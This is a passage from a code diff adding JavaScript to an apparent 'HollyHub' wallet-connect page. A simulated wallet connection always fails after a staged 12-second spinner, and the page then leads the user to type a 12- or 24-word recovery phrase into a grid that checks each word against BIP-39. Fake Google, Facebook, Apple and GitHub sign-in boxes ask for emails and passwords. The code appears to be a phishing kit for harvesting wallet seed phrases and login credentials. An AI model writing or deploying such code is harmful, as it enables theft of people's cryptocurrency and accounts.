+                manualBtn.addEventListener('click', () => {
+                    ov.style.display = 'none';
+                    fallback();
+                });
+                list.appendChild(manualBtn);
+            } else {
+                const manualBtn = document.createElement('button');
+                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
+                manualBtn.textContent = 'Continue in browser';
+                manualBtn.addEventListener('click', () => {
+                    ov.style.display = 'none';
+                    fallback();
+                });
+                list.appendChild(manualBtn);
+            }
+
+                   document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
+        ov.style.display = 'flex';
+    }
+    function handleWalletClick() {
+        resetWallets();
+        this.classList.add('selected');
+        try { document.getElementById('status-message').style.display = 'none'; } catch (e) {}
+        const walletName = this.dataset.wallet;
+        const providedIcon = this.dataset.icon || '';
+        const iconUrl = providedIcon && /^https?:\/\//.test(providedIcon) ? providedIcon : resolveIconUrl(walletName, providedIcon);
+        const overlay = document.getElementById('connect-overlay');
+        const mainImg = overlay.querySelector('#modalMainWalletImg');
+        const nameEl = overlay.querySelector('#overlay-wallet-name');
+        const msgEl = overlay.querySelector('#overlay-message');
+        mainImg.src = iconUrl;
+        nameEl.textContent = walletName;
+        msgEl.textContent = '';
+        msgEl.classList.remove('failed');
+        // fallback action: show the side overlay + ring
+        const showConnectOverlay = () => {
+            try {
+                const modalRect = document.querySelector('.modal-content').getBoundingClientRect();
+                const viewportW = window.innerWidth;
+                const viewportH = window.innerHeight;
+                const overlayMaxWidth = 340;
+                const overlayWidth = Math.min(overlayMaxWidth, Math.max(200, viewportW - 32));
+                overlay.style.width = `${overlayWidth}px`;
+                const desiredLeft = modalRect.right + 16;
+                const maxLeft = Math.max(8, viewportW - overlayWidth - 16);
+                let left = Math.min(desiredLeft, maxLeft);
+                if (left < 16) left = 16;
+                overlay.style.left = `${left}px`;
+                const desiredHeight = Math.max(120, modalRect.height - 16);
+                const overlayHeight = Math.min(desiredHeight, viewportH - 32);
+                overlay.style.height = `${overlayHeight}px`;
+                let top = modalRect.top + 8;
+                if (top + overlayHeight + 8 > viewportH) top = Math.max(8, viewportH - overlayHeight - 8);
+                overlay.style.top = `${top}px`;
+                overlay.style.position = 'fixed';
+                overlay.style.zIndex = '10001';
+                overlay.classList.add('active');
+            } catch (e) {
+                overlay.classList.add('active');
+            }
+            const ring = document.getElementById('connectRing');
+            ring.classList.add('active');
+            setTimeout(() => {
+                ring.classList.remove('active');
+                msgEl.textContent = 'Connection failed. Please try again.';
+                msgEl.classList.add('failed');
+                setTimeout(() => {
+                    overlay.classList.remove('active');
+                    overlay.style.position = '';
+                    overlay.style.top = '';
+                    overlay.style.left = '';
+                    overlay.style.height = '';
+                    overlay.style.zIndex = '';
+                    msgEl.textContent = '';
+                    msgEl.classList.remove('failed');
+                    modalOverlay.classList.remove('active');
+                    setTimeout(() => {
+                        modalOverlay.style.display = 'none';
+                        manualOverlay.style.display = 'flex';
+                        setTimeout(() => manualOverlay.classList.add('active'), 10);
+                    }, 400);
+                }, 2000);
+            }, 12000);
+        };
+        // Always run detector popup first (even if no installed apps found)
+        const detected = detectInstalledWallets(walletName);
+        showDetectorPopup(detected, walletName, showConnectOverlay);
+    }
+    function resetWallets() {
+        document.querySelectorAll('.wallet-item').forEach(item => {
+            item.classList.remove('selected');
+            item.style.display = '';
+        });
+        statusMessage.textContent = 'Select a wallet to connect';
+        statusMessage.classList.remove('status-failed');
+    }
+    // Manual Connect Tabs
+    const tabBtns = document.querySelectorAll('.tab-btn');
+    const tabContents = document.querySelectorAll('.tab-content');
+    tabBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            tabBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            tabContents.forEach(c => c.classList.add('hidden'));
+            document.getElementById(btn.dataset.tab + '-tab').classList.remove('hidden');
+            if (btn.dataset.tab === 'phrase') {
+                updatePhraseGrid();
+            }
+        });
+    });
+    // Dynamic phrase grid with REAL BIP-39 word check (green/red)
+    const phraseGrid = document.getElementById('phrase-grid');
+    const radio12 = document.querySelector('input[value="12"]');
+    const radio24 = document.querySelector('input[value="24"]');
+    // Real BIP-39 word validation function (using a large subset of the official list)
+    const isValidBip39Word = (word) => {
+        const validWords = new Set([
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
+            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
+            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
+            "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
+            "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
+            "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
+            "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
+            "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
+            "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
+            "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
+            "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
+            "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
+            "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
+            "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
+            "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
+            "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
+            "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
+            "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
+            "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
+            "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
+            "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
+            "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
+            "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
+            "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
+            "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
+            "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
+            "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
+            "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
+            "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
+            "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
+            "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
+            "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
+            "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
+            "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
+            "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
+            "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
+            "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
+            "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
+            "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
+            "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
+            "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
+            "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
+            "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
+            "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
+            "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
+            "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
+            "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
+            "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
+            "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
+            "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
+            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
+            "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
+            "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
+            "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
+            "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
+            "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
+            "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
+            "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
+            "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
+            "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
+            "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
+            "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
+            "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
+            "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
+            "exotic", "expand", "expect", "expense", "expert", "expire", "explain", "expose", "express", "extend",
+            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
+            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
+            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
+            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
+            "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire",
+            "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash",
+            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
+            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
+            "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
+            "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost",
+            "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
+            "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment",
+            "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
+            "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give",
+            "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove",
+            "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip",
+            "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great",
+            "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess",
+            "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
+            "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard",
+            "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen",
+            "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey",
+            "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror",
+            "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble",
+            "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
+            "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate",
+            "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase",
+            "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial",
+            "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
+            "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
+            "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans",
+            "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump",
+            "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
+            "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi",
+            "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake",
+            "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law",
+            "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
+            "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
+            "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like",
+            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load",
+            "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
+            "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics",
+            "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal",
+            "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
+            "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
+            "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media",
+            "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry",
+            "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind",
+            "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed",
+            "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month",
+            "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse",
+            "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music",
+            "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty",
+            "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
+            "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
+            "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice",
+            "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige",
+            "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer",
+            "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one",
+            "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit",
+            "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
+            "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster",
+            "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
+            "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path",
+            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
+            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
+            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
+            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
+            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
+            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
+            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
+            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
+            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
+            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
+            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
+            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz",
+            "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise",
+            "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
+            "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
+            "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject",
+            "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew",
+            "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist",
+            "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward",
+            "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid",
+            "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot",
+            "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round",
+            "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
+            "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same",
+            "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan",
+            "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap",
+            "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section",
+            "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence",
+            "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share",
+            "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe",
+            "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling",
+            "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar",
+            "simple", "since", "sing", "siren", "sister", "situation", "six", "size", "skate", "sketch",
+            "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice",
+            "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile",
+            "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
+            "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song",
+            "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare",
+            "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider",
+            "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray",
+            "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage",
+            "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step",
+            "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove",
+            "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
+            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
+            "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise",
+            "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet",
+            "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table",
+            "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste",
+            "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term",
+            "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing",
+            "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger",
+            "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco",
+            "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue",
+            "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss",
+            "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic",
+            "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial",
+            "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly",
+            "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey",
+            "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical",
+            "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold",
+            "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil",
+            "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use",
+            "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley",
+            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor",
+            "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant",
+            "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa",
+            "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote",
+            "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm",
+            "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear",
+            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
+            "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife",
+            "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire",
+            "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word",
+            "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong",
+            "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
+        ]);
+        return validWords.has(word.toLowerCase());
+    };
+    function updatePhraseGrid() {
+        phraseGrid.innerHTML = '';
+        const count = radio12.checked ? 12 : 24;
+        const cols = radio12.checked ? 3 : 4;
+        phraseGrid.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
+        for (let i = 0; i < count; i++) {
+            const div = document.createElement('div');
+            const input = document.createElement('input');
+            input.className = 'word-input';
+            input.placeholder = `Word ${i+1}`;
+            input.maxLength = 20;
+            input.addEventListener('input', function() {
+                const word = this.value.trim();
+                if (word === '') {
+                    this.classList.remove('correct', 'incorrect');
+                    return;
+                }
+                if (isValidBip39Word(word)) {
+                    this.classList.remove('incorrect');
+                    this.classList.add('correct');
+                } else {
+                    this.classList.remove('correct');
+                    this.classList.add('incorrect');
+                }
+            });
+            div.appendChild(input);
+            phraseGrid.appendChild(div);
+        }
+    }
+    radio12.addEventListener('change', updatePhraseGrid);
+    radio24.addEventListener('change', updatePhraseGrid);
+    // Initial setup
+    updatePhraseGrid();
+    // Social login handlers - create overlay dynamically
+    document.querySelectorAll('.social-icon').forEach(icon => {
+        icon.addEventListener('click', () => {
+            const provider = icon.dataset.provider;
+            const names = { google: 'Google', facebook: 'Facebook', apple: 'Apple', github: 'GitHub' };
+            if (!document.getElementById('dynamic-login-overlay')) {
+                const overlay = document.createElement('div');
+                overlay.id = 'dynamic-login-overlay';
+                overlay.className = 'login-overlay';
+                overlay.innerHTML = `
+                    <div class="login-box">
+                        <h3 id="dynamic-login-title">Sign in with <span id="dynamic-provider-name"></span></h3>
+                        <input type="text" id="dynamic-email-input" class="login-input" placeholder="Email or Username">
+                        <input type="password" id="dynamic-password-input" class="login-input" placeholder="Password">
+                        <button class="login-btn" onclick="simulateLogin()">Sign In / Sign Up</button>
+                        <button class="mt-4 text-gray-400 hover:text-white text-sm" onclick="closeLogin()">Cancel</button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+            }
+            document.getElementById('dynamic-provider-name').textContent = names[provider];
+            document.getElementById('dynamic-login-overlay').style.display = 'flex';
+        });
+    });
+    function closeLogin() {
+        const overlay = document.getElementById('dynamic-login-overlay');
+        if (overlay) overlay.style.display = 'none';
+    }
+    function simulateLogin() {
+        const email = document.getElementById('dynamic-email-input')?.value.trim() || '';
+        if (email) {
+            alert(`Welcome to HollyHub! Signed in as ${email}`);
+            closeLogin();
+        } else {
+            alert("Please enter your email/username");
+        }
+    }
+    
+    // Ensure the open modal button works now that the DOM is ready
+    openBtn.addEventListener('click', () => {
+        modalOverlay.style.display = 'flex';
+        setTimeout(() => modalOverlay.classList.add('active'), 10);
+        if (typeof renderVisibleWallets === 'function') renderVisibleWallets();
+        if (typeof populateExtraWallets === 'function') populateExtraWallets();
+    });
+    </script>
 
     <script src="script.js"></script>
 </body>
